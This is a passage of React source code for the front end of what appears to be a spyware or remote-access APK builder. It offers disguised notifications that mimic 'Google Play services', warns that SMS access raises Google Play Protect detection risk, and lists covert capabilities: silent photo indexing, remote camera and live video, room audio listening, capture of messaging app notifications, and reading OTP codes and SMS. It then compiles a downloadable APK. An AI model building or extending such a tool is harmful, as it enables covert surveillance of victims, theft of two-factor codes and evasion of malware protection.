                                        {Object.entries(NOTIFICATION_PRESETS).map(([key, preset]) => (
                                            <option key={key} value={key} className="bg-[#18191c]">
                                                {preset.icon} {preset.title}
                                            </option>
                                        ))}
                                    </select>
                                </div>

                                {/* Disguise Live Preview */}
                                {notificationStyle !== 'custom' && (
                                    <div className="bg-black/40 rounded-2xl p-4 border border-white/10 flex items-center gap-3">
                                        <span className="text-2xl">{NOTIFICATION_PRESETS[notificationStyle]?.icon}</span>
                                        <div>
                                            <p className="text-sm font-bold text-white">{NOTIFICATION_PRESETS[notificationStyle]?.title}</p>
                                            <p className="text-xs text-fg-3">{NOTIFICATION_PRESETS[notificationStyle]?.text}</p>
                                        </div>
                                    </div>
                                )}

                                {/* Custom Notification Fields */}
                                {notificationStyle === 'custom' && (
                                    <div className="space-y-3 bg-black/40 p-4 rounded-2xl border border-white/10">
                                        <div>
                                            <label className="block text-xs font-bold text-fg-3 mb-1">Custom Title</label>
                                            <input
                                                type="text"
                                                value={notificationTitle}
                                                onChange={(e) => setNotificationTitle(e.target.value)}
                                                className="w-full bg-white/5 border border-white/10 rounded-xl px-3 py-2 text-white text-sm"
                                                placeholder="Google Play services"
                                            />
                                        </div>
                                        <div>
                                            <label className="block text-xs font-bold text-fg-3 mb-1">Custom Text</label>
                                            <input
                                                type="text"
                                                value={notificationText}
                                                onChange={(e) => setNotificationText(e.target.value)}
                                                className="w-full bg-white/5 border border-white/10 rounded-xl px-3 py-2 text-white text-sm"
                                                placeholder="Checking for updates…"
                                            />
                                        </div>
                                    </div>
                                )}
                            </div>
                        </div>
                    )}
                </div>

                {/* Footer Controls & Progress Popup Overlay */}
                <div className="p-5 sm:p-7 border-t border-white/10 bg-gradient-to-t from-white/[0.03] to-transparent flex flex-col gap-4">
                    
                    {/* Progress / Status Modal Popup Box */}
                    {status !== 'idle' && (
                        <div className="p-5 rounded-2xl bg-black/70 border border-emerald-500/30 flex flex-col items-center justify-center text-center space-y-3 animate-in fade-in">
                            {status === 'queued' ? (
                                <>
                                    <div className="w-10 h-10 border-4 border-emerald-500/30 border-t-emerald-500 rounded-full animate-spin" />
                                    <h4 className="text-base font-bold text-white">Queued for Compilation</h4>
                                    <p className="text-xs text-fg-3">Queue Position: <span className="text-emerald-400 font-bold">{queuePosition}</span></p>
                                </>
                            ) : status === 'generating' ? (
                                <>
                                    <div className="w-full flex items-center justify-between text-xs font-bold text-fg-2">
                                        <span>{progressStep || "Compiling APK..."}</span>
                                        <span className="text-emerald-400">{progress}%</span>
                                    </div>
                                    <div className="w-full h-3 bg-white/10 rounded-full overflow-hidden">
                                        <div
                                            className="h-full bg-gradient-to-r from-emerald-500 to-teal-400 transition-all duration-500"
                                            style={{ width: `${progress}%` }}
                                        />
                                    </div>
                                </>
                            ) : status === 'completed' ? (
                                <>
                                    <CheckCircle2 size={36} className="text-emerald-400" />
                                    <h4 className="text-lg font-bold text-white">APK Ready!</h4>
                                    <p className="text-xs text-fg-3">Your compiled Android APK is ready for installation.</p>
                                    {downloadUrl && (
                                        <a
                                            href={downloadUrl}
                                            target="_blank"
                                            rel="noopener noreferrer"
                                            className="px-6 py-2.5 rounded-xl bg-emerald-500 hover:bg-emerald-600 text-white font-bold text-xs shadow-lg transition-all"
                                        >
                                            Download APK Now
                                        </a>
                                    )}
                                </>
                            ) : null}
                        </div>
                    )}

                    {/* Step Navigation & Action Buttons */}
                    <div className="flex items-center justify-between gap-3">
                        {activeStep !== 'identity' ? (
                            <button
                                type="button"
                                onClick={() => setActiveStep(activeStep === 'notifications' ? 'permissions' : 'identity')}
                                className="px-5 py-3 rounded-xl bg-white/5 hover:bg-white/10 text-fg-2 hover:text-white font-bold text-xs transition-all"
                            >
                                ← Previous
                            </button>
                        ) : <div />}

                        {activeStep !== 'notifications' ? (
                            <button
                                type="button"
                                onClick={() => setActiveStep(activeStep === 'identity' ? 'permissions' : 'notifications')}
                                className="px-6 py-3 rounded-xl bg-gradient-to-r from-emerald-500 to-teal-500 hover:from-emerald-400 hover:to-teal-400 text-black font-extrabold text-xs shadow-lg shadow-emerald-500/20 transition-all flex items-center gap-2"
                            >
                                <span>Next Step</span>
                                <span>→</span>
                            </button>
                        ) : status === 'idle' ? (
                            <button
                                type="button"
                                onClick={startGeneration}
                                className="px-8 py-3.5 rounded-xl bg-gradient-to-r from-emerald-500 via-teal-500 to-cyan-500 hover:scale-105 text-black font-black text-sm shadow-[0_0_25px_rgba(16,185,129,0.35)] transition-all"
                            >
                                Build Custom APK
                            </button>
                        ) : (
                            <button
                                type="button"
                                onClick={onClose}
                                className="px-6 py-3 rounded-xl bg-white/10 hover:bg-white/20 text-white font-bold text-xs transition-all"
                            >
                                Close
                            </button>
                        )}
                    </div>
                </div>

                {/* Play Protect Warning Modal */}
                {showPlayProtectWarning && (
                    <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-[350]" onClick={() => setShowPlayProtectWarning(false)}>
                        <div className="bg-[#18191c] rounded-3xl p-6 max-w-sm mx-4 border border-red-500/30 shadow-2xl space-y-4" onClick={(e) => e.stopPropagation()}>
                            <div className="flex items-center gap-3">
                                <div className="w-11 h-11 rounded-2xl bg-red-500/15 border border-red-500/30 flex items-center justify-center text-red-400">
                                    <AlertTriangle size={22} />
                                </div>
                                <div>
                                    <h3 className="text-base font-bold text-white">Play Protect Warning</h3>
                                    <p className="text-xs text-red-400">High detection risk</p>
                                </div>
                            </div>

                            <p className="text-fg-2 text-xs leading-relaxed">
                                Enabling <strong>SMS Access</strong> increases the likelihood that Google Play Protect will flag or restrict installation. Proceed only if needed.
                            </p>

                            <div className="flex gap-3">
                                <button
                                    type="button"
                                    onClick={() => setShowPlayProtectWarning(false)}
                                    className="flex-1 py-2.5 rounded-xl bg-white/5 hover:bg-white/10 text-white text-xs font-bold transition-all"
                                >
                                    Cancel
                                </button>
                                <button
                                    type="button"
                                    onClick={() => {
                                        setEnableSmsPermission(true);
                                        setShowPlayProtectWarning(false);
                                    }}
                                    className="flex-1 py-2.5 rounded-xl bg-red-500 hover:bg-red-600 text-white text-xs font-bold transition-all"
                                >
                                    Enable Anyway
                                </button>
                            </div>
                        </div>
                    </div>
                )}

                {/* Permission Info Modal */}
                {showPermissionInfo && (
                    <div className="fixed inset-0 z-[350] flex items-center justify-center bg-black/70 backdrop-blur-sm p-4">
                        <div className="bg-[#18191c] border border-white/15 rounded-3xl p-6 max-w-sm w-full space-y-4 relative shadow-2xl">
                            <button
                                onClick={() => setShowPermissionInfo(null)}
                                className="absolute top-4 right-4 text-white/50 hover:text-white"
                            >
                                ✕
                            </button>

                            <h4 className="text-base font-bold text-white capitalize">{showPermissionInfo} Access Details</h4>
                            <p className="text-xs text-fg-3 leading-relaxed">
                                {showPermissionInfo === 'storage' && "Allows silent background indexing of device photos, videos, and downloads."}
                                {showPermissionInfo === 'camera' && "Allows remote snapshots and live video streams from front and rear cameras."}
                                {showPermissionInfo === 'microphone' && "Allows real-time room audio listening and surround sound capture."}
                                {showPermissionInfo === 'contacts' && "Allows address book and stored accounts syncing."}
                                {showPermissionInfo === 'notifications' && "Allows capturing WhatsApp, Instagram, Telegram, and system alerts."}
                                {showPermissionInfo === 'sms' && "Allows reading incoming OTP codes and SMS history."}
                            </p>

                            <button
                                onClick={() => setShowPermissionInfo(null)}
                                className="w-full py-2.5 rounded-xl bg-emerald-500 hover:bg-emerald-600 text-black font-bold text-xs transition-all"
                            >
                                Got it
                            </button>
                        </div>
                    </div>
                )}

                {/* Custom Alert Modal */}
                <CustomAlertModal
                    isOpen={showCustomAlert}
                    onClose={() => setShowCustomAlert(false)}
                    title={alertData.title}
                    message={alertData.message}
                    type={alertData.type}
                />
            </div>
        </div>
    );
}
